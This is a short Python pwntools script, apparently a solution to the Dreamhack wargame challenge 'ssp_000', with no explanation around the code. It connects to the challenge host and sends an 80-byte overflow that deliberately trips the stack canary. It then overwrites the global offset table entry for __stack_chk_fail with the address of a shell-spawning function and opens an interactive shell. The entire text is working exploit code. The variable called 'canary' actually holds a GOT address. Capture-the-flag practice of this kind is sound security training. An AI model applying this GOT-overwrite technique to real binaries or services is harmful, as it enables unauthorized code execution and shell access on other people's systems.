from pwn import *

p = remote('host3.dreamhack.games', '8745')
#p = process('./ssp_000')
e = ELF('./ssp_000')

shell = 0x4008ea
payload = b"A"*0x50 #+ p64(shell)

canary = e.got['__stack_chk_fail']

print(hex(canary))

p.send(payload)
p.sendlineafter(b"Addr :", str(canary).encode())
p.sendlineafter(b"Value : ", str(shell).encode())

p.interactive()